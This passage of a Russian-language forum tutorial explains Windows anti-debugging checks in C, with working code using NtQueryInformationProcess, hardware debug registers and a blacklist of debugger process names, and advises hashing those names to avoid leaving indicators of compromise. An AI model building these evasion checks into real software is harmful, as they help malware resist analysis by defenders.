		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtQueryInformationProcess(
  IN    HANDLE           ProcessHandle,               // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞, –¥–ª—è –∫–æ—Ç–æ—Ä–æ–≥–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é.
  IN    PROCESSINFOCLASS ProcessInformationClass,     // –¢–∏–ø –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø—Ä–æ—Ü–µ—Å—Å–µ.
  OUT   PVOID            ProcessInformation,          // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±—É—Ñ–µ—Ä, –≤ –∫–æ—Ç–æ—Ä—ã–π —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç –∑–∞–ø—Ä–æ—à–µ–Ω–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é.
  IN    ULONG            ProcessInformationLength,    // –†–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞, —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ &#039;ProcessInformation&#039;.
  OUT   PULONG           ReturnLength                 // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –≤ –∫–æ—Ç–æ—Ä–æ–π —Ñ—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ä–∞–∑–º–µ—Ä –∑–∞–ø—Ä–æ—à–µ–Ω–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏.
);</code></pre>
	</div>
</div><br />
<b>–§–ª–∞–≥ ProcessDebugPort</b><br />
<br />
–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è Microsoft –æ —Ñ–ª–∞–≥–µ ProcessDebugPort –≥–ª–∞—Å–∏—Ç —Å–ª–µ–¥—É—é—â–µ–µ:<br />
<br />
–ü–æ–ª—É—á–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ —Ç–∏–ø–∞ DWORD_PTR, –∫–æ—Ç–æ—Ä–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç –Ω–æ–º–µ—Ä –ø–æ—Ä—Ç–∞ –æ—Ç–ª–∞–¥—á–∏–∫–∞ –¥–ª—è –ø—Ä–æ—Ü–µ—Å—Å–∞. –ù–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ —É–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ –ø—Ä–æ—Ü–µ—Å—Å –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ–¥ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ–º –æ—Ç–ª–∞–¥—á–∏–∫–∞ —É—Ä–æ–≤–Ω—è 3.<br />
<br />
–î—Ä—É–≥–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, –µ—Å–ª–∏ NtQueryInformationProcess –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –Ω–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, –ø–æ–ª—É—á–µ–Ω–Ω–æ–µ —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä ProcessInformation, —Ç–æ –ø—Ä–æ—Ü–µ—Å—Å –∞–∫—Ç–∏–≤–Ω–æ –æ—Ç–ª–∞–∂–∏–≤–∞–µ—Ç—Å—è.<br />
<br />
<b>–§–ª–∞–≥ ProcessDebugObjectHandle</b><br />
<br />
–ù–µ—É–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ñ–ª–∞–≥ ProcessDebugObjectHandle —Ä–∞–±–æ—Ç–∞–µ—Ç –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ —Ñ–ª–∞–≥—É ProcessDebugPort –∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –æ–±—ä–µ–∫—Ç–∞ –æ—Ç–ª–∞–¥–∫–∏ —Ç–µ–∫—É—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–∑–¥–∞–µ—Ç—Å—è, –µ—Å–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ä–µ–∂–∏–º–µ –æ—Ç–ª–∞–¥–∫–∏.<br />
–ï—Å–ª–∏ NtQueryInformationProcess –Ω–µ —É–¥–∞–µ—Ç—Å—è –ø–æ–ª—É—á–∏—Ç—å –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ–±—ä–µ–∫—Ç–∞ –æ—Ç–ª–∞–¥–∫–∏, —ç—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –æ–Ω –Ω–µ –æ–±–Ω–∞—Ä—É–∂–∏–ª –æ—Ç–ª–∞–¥—á–∏–∫, –∏ —Ñ—É–Ω–∫—Ü–∏—è –≤–µ—Ä–Ω–µ—Ç –∫–æ–¥ –æ—à–∏–±–∫–∏ 0xC0000353. –°–æ–≥–ª–∞—Å–Ω–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft –æ –∑–Ω–∞—á–µ–Ω–∏—è—Ö NTSTATUS, –∫–æ–¥ –æ—à–∏–±–∫–∏ —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–µ–Ω STATUS_PORT_NOT_SET.<br />
<br />
<b>–ö–æ–¥ –∞–Ω—Ç–∏–æ—Ç–ª–∞–¥–∫–∏<br />
<br />
NtQueryInformationProcess </b><br />
<br />
–§—É–Ω–∫—Ü–∏—è NtQIPDebuggerCheck –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∫–∞–∫ ProcessInformation, —Ç–∞–∫ –∏ ProcessDebugObjectHandle –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –æ—Ç–ª–∞–¥—á–∏–∫–æ–≤. –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ NtQueryInformationProcess –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä, –∏—Å–ø–æ–ª—å–∑—É—è –æ–±–∞ —Ñ–ª–∞–≥–∞ ProcessDebugPort –∏ ProcessDebugObjectHandle.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL NtQIPDebuggerCheck() {

    NTSTATUS                      STATUS                        = NULL;
    fnNtQueryInformationProcess   pNtQueryInformationProcess    = NULL;
    DWORD64                       dwIsDebuggerPresent           = NULL;
    DWORD64                       hProcessDebugObject           = NULL;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ NtQueryInformationProcess
    pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT(&quot;NTDLL.DLL&quot;)), &quot;NtQueryInformationProcess&quot;);
    if (pNtQueryInformationProcess == NULL) {
        printf(&quot;\t[!] GetProcAddress –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –í—ã–∑–æ–≤ NtQueryInformationProcess —Å —Ñ–ª–∞–≥–æ–º &#039;ProcessDebugPort&#039;
    STATUS = pNtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessDebugPort,
        &amp;dwIsDebuggerPresent,
        sizeof(DWORD64),
        NULL
    );

    if (STATUS != 0x0) {
        printf(&quot;\t[!] NtQueryInformationProcess [1] –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å —Å –∫–æ–¥–æ–º —Å—Ç–∞—Ç—É—Å–∞: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // –ï—Å–ª–∏ NtQueryInformationProcess –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –Ω–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –º—ã –Ω–∞—Ö–æ–¥–∏–º—Å—è –≤ —Ä–µ–∂–∏–º–µ –æ—Ç–ª–∞–¥–∫–∏
    if (dwIsDebuggerPresent != NULL) {
        // –æ–±–Ω–∞—Ä—É–∂–µ–Ω –æ—Ç–ª–∞–¥—á–∏–∫
        return TRUE;
    }

    // –í—ã–∑–æ–≤ NtQueryInformationProcess —Å —Ñ–ª–∞–≥–æ–º &#039;ProcessDebugObjectHandle&#039;
    STATUS = pNtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessDebugObjectHandle,
        &amp;hProcessDebugObject,
        sizeof(DWORD64),
        NULL
    );

    // –ï—Å–ª–∏ STATUS –Ω–µ —Ä–∞–≤–µ–Ω 0 –∏ –Ω–µ —Ä–∞–≤–µ–Ω 0xC0000353 (—ç—Ç–æ &#039;STATUS_PORT_NOT_SET&#039;)
    if (STATUS != 0x0 &amp;&amp; STATUS != 0xC0000353) {
        printf(&quot;\t[!] NtQueryInformationProcess [2] –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å —Å –∫–æ–¥–æ–º —Å—Ç–∞—Ç—É—Å–∞: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // –ï—Å–ª–∏ NtQueryInformationProcess –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –Ω–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –º—ã –Ω–∞—Ö–æ–¥–∏–º—Å—è –≤ —Ä–µ–∂–∏–º–µ –æ—Ç–ª–∞–¥–∫–∏
    if (hProcessDebugObject != NULL) {
        // –æ–±–Ω–∞—Ä—É–∂–µ–Ω –æ—Ç–ª–∞–¥—á–∏–∫
        return TRUE;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –æ—Ç–ª–∞–¥—á–∏–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∞–ø–ø–∞—Ä–∞—Ç–Ω—ã—Ö —Ç–æ—á–µ–∫ –æ—Å—Ç–∞–Ω–æ–≤–∞</b><br />
<br />
–≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω —Ç–æ–ª—å–∫–æ –≤ —Ç–æ–º —Å–ª—É—á–∞–µ, –µ—Å–ª–∏ –≤–æ –≤—Ä–µ–º—è –æ—Ç–ª–∞–¥–∫–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã –∞–ø–ø–∞—Ä–∞—Ç–Ω—ã–µ —Ç–æ—á–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–∞. –ê–ø–ø–∞—Ä–∞—Ç–Ω—ã–µ —Ç–æ—á–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–∞, —Ç–∞–∫–∂–µ –∏–∑–≤–µ—Å—Ç–Ω—ã–µ –∫–∞–∫ —Ä–µ–≥–∏—Å—Ç—Ä—ã –∞–ø–ø–∞—Ä–∞—Ç–Ω–æ–π –æ—Ç–ª–∞–¥–∫–∏, —è–≤–ª—è—é—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–µ–π —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –º–∏–∫—Ä–æ–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–≤, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–∏–æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ –ø—Ä–∏ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–∞ –ø–∞–º—è—Ç–∏ –∏–ª–∏ —Å–æ–±—ã—Ç–∏—è. –ê–ø–ø–∞—Ä–∞—Ç–Ω—ã–µ —Ç–æ—á–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–∞ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω—ã –≤ —Å–∞–º–æ–º –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ –∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –±–æ–ª–µ–µ –±—ã—Å—Ç—Ä—ã –∏ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã, —á–µ–º –æ–±—ã—á–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º–Ω—ã–µ —Ç–æ—á–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–∞, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞–≤–∏—Å—è—Ç –æ—Ç –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –æ—Ç–ª–∞–¥—á–∏–∫–∞ –¥–ª—è –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
<br />
–ö–æ–≥–¥–∞ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –∞–ø–ø–∞—Ä–∞—Ç–Ω—ã–µ —Ç–æ—á–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–∞, –∏–∑–º–µ–Ω—è—é—Ç—Å—è –∑–Ω–∞—á–µ–Ω–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã—Ö —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤. –ó–Ω–∞—á–µ–Ω–∏—è —ç—Ç–∏—Ö —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è, –ø–æ–¥–∫–ª—é—á–µ–Ω –ª–∏ –æ—Ç–ª–∞–¥—á–∏–∫ –∫ –ø—Ä–æ—Ü–µ—Å—Å—É. –ï—Å–ª–∏ —Ä–µ–≥–∏—Å—Ç—Ä—ã Dr0, Dr1, Dr2 –∏ Dr3 —Å–æ–¥–µ—Ä–∂–∞—Ç –Ω–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, —Ç–æ –∞–ø–ø–∞—Ä–∞—Ç–Ω–∞—è —Ç–æ—á–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞. –í —Å–ª–µ–¥—É—é—â–µ–º –ø—Ä–∏–º–µ—Ä–µ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –∞–ø–ø–∞—Ä–∞—Ç–Ω–∞—è —Ç–æ—á–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–∞ –Ω–∞ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ NtAllocateVirtualMemory —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –æ—Ç–ª–∞–¥—á–∏–∫–∞ xdbg. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, –∫–∞–∫ –∑–Ω–∞—á–µ–Ω–∏–µ Dr0 –∏–∑–º–µ–Ω—è–µ—Ç—Å—è —Å –Ω—É–ª—è –Ω–∞ –∞–¥—Ä–µ—Å NtAllocateVirtualMemory.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787144016.png"
		data-src="https://osint42.org/attachments/1746787144016-png.242/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787144016-png.242/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787144016.png"
			title="1746787144016.png"
			width="1784" height="385" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787150135.png"
		data-src="https://osint42.org/attachments/1746787150135-png.243/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787150135-png.243/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787150135.png"
			title="1746787150135.png"
			width="1136" height="149" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787155457.png"
		data-src="https://osint42.org/attachments/1746787155457-png.244/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787155457-png.244/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787155457.png"
			title="1746787155457.png"
			width="1740" height="270" loading="lazy" />
	</div><br />
<br />
<b>–ü–æ–ª—É—á–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏–π —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤</b><br />
<br />
–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∑–Ω–∞—á–µ–Ω–∏–π —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤ Dr –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é WinAPI GetThreadContext.<br />
–§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∫–æ–Ω—Ç–µ–∫—Å—Ç –≤ –≤–∏–¥–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã CONTEXT. –≠—Ç–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ —Ç–∞–∫–∂–µ –≤–∫–ª—é—á–∞–µ—Ç –≤ —Å–µ–±—è –∑–Ω–∞—á–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤ Dr0, Dr1, Dr2 –∏ Dr3.<br />
<br />
–§—É–Ω–∫—Ü–∏—è HardwareBpCheck –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç –Ω–∞–ª–∏—á–∏–µ –æ—Ç–ª–∞–¥—á–∏–∫–∞ –ø—É—Ç–µ–º –ø—Ä–æ–≤–µ—Ä–∫–∏ –∑–Ω–∞—á–µ–Ω–∏–π –≤—ã—à–µ—É–∫–∞–∑–∞–Ω–Ω—ã—Ö —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤.<br />
–§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω –æ—Ç–ª–∞–¥—á–∏–∫.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL HardwareBpCheck() {

    CONTEXT        Ctx        = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

    if (!GetThreadContext(GetCurrentThread(), &amp;Ctx)) {
        printf(&quot;\t[!] GetThreadContext –Ω–µ —É–¥–∞–ª–æ—Å—å : %d \n&quot;, GetLastError());
        return FALSE;
    }

    if (Ctx.Dr0 != NULL || Ctx.Dr1 != NULL || Ctx.Dr2 != NULL || Ctx.Dr3 != NULL)
        return TRUE; // –û–±–Ω–∞—Ä—É–∂–µ–Ω –æ—Ç–ª–∞–¥—á–∏–∫

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –æ—Ç–ª–∞–¥—á–∏–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —á–µ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤</b><br />
<br />
–î—Ä—É–≥–æ–π —Å–ø–æ—Å–æ–± –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –≤ —Ä–µ–∂–∏–º–µ –æ—Ç–ª–∞–¥–∫–∏ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –ø—Ä–æ–≤–µ—Ä–∫–µ –∏–º–µ–Ω —Ç–µ–∫—É—â–∏—Ö –≤—ã–ø–æ–ª–Ω—è—é—â–∏—Ö—Å—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –ø–æ —Å–ø–∏—Å–∫—É –∏–∑–≤–µ—Å—Ç–Ω—ã—Ö –∏–º–µ–Ω –æ—Ç–ª–∞–¥—á–∏–∫–æ–≤. –≠—Ç–æ—Ç &quot;—á–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫&quot; –∏–º–µ–Ω —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ –∂–µ—Å—Ç–∫–æ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–æ–º –º–∞—Å—Å–∏–≤–µ. –ï—Å–ª–∏ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ –º–µ–∂–¥—É –∏–º–µ–Ω–µ–º –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ —Å–ø–∏—Å–∫–æ–º –∑–∞–ø—Ä–µ—Ç–Ω—ã—Ö –∏–º–µ–Ω, —Ç–æ –Ω–∞ —Å–∏—Å—Ç–µ–º–µ —Ä–∞–±–æ—Ç–∞–µ—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –æ—Ç–ª–∞–¥—á–∏–∫–∞.<br />
<br />
–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, –≤—ã–ø–æ–ª–Ω—è—é—â–∏—Ö—Å—è –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ, –º–æ–∂–Ω–æ –æ—Å—É—â–µ—Å—Ç–≤–∏—Ç—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ª—é–±–æ–≥–æ –∏–∑ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–Ω—ã—Ö —Ä–∞–Ω–µ–µ –º–µ—Ç–æ–¥–æ–≤. –í –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –º–µ—Ç–æ–¥ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ CreateToolhelp32Snapshot.<br />
<br />
–ú–∞—Å—Å–∏–≤ —á–µ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define BLACKLISTARRAY_SIZE 5 // –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –≤ –º–∞—Å—Å–∏–≤–µ

WCHAR* g_BlackListedDebuggers[BLACKLISTARRAY_SIZE] = {
        L&quot;x64dbg.exe&quot;,                 // –û—Ç–ª–∞–¥—á–∏–∫ xdbg
        L&quot;ida.exe&quot;,                    // –î–∏–∑–∞—Å—Å–µ–º–±–ª–µ—Ä IDA
        L&quot;ida64.exe&quot;,                  // –î–∏–∑–∞—Å—Å–µ–º–±–ª–µ—Ä IDA
        L&quot;VsDebugConsole.exe&quot;,         // –û—Ç–ª–∞–¥—á–∏–∫ Visual Studio
        L&quot;msvsmon.exe&quot;                 // –û—Ç–ª–∞–¥—á–∏–∫ Visual Studio
};</code></pre>
	</div>
</div><br />
–ú–∞—Å—Å–∏–≤ —á–µ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å –∫–∞–∫ –º–æ–∂–Ω–æ –±–æ–ª—å—à–µ –∏–º–µ–Ω –æ—Ç–ª–∞–¥—á–∏–∫–æ–≤, —á—Ç–æ–±—ã –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å —à–∏—Ä–æ–∫–∏–π —Å–ø–µ–∫—Ç—Ä –æ—Ç–ª–∞–¥—á–∏–∫–æ–≤. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Å—Ç—Ä–æ–∫–∏ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω—ã —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫, —Ç–∞–∫ –∫–∞–∫ –∏–º–µ–Ω–∞ –æ—Ç–ª–∞–¥—á–∏–∫–æ–≤ –≤ –±–∏–Ω–∞—Ä–Ω–æ–º —Ñ–∞–π–ª–µ –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –∫–∞–∫ –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏.<br />
<br />
–§—É–Ω–∫—Ü–∏—è BlackListedProcessesCheck –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –º–∞—Å—Å–∏–≤ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ g_BlackListedDebuggers –≤ –∫–∞—á–µ—Å—Ç–≤–µ –º–∞—Å—Å–∏–≤–∞ –∑–∞–ø—Ä–µ—Ç–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤. –û–Ω–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE –≤ —Å–ª—É—á–∞–µ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è –∏–º–µ–Ω–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å —ç–ª–µ–º–µ–Ω—Ç–æ–º g_BlackListedDebuggers.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL BlackListedProcessesCheck() {

    HANDLE                hSnapShot        = NULL;
    PROCESSENTRY32W        ProcEntry        = { .dwSize = sizeof(PROCESSENTRY32W) };
    BOOL                bSTATE            = FALSE;


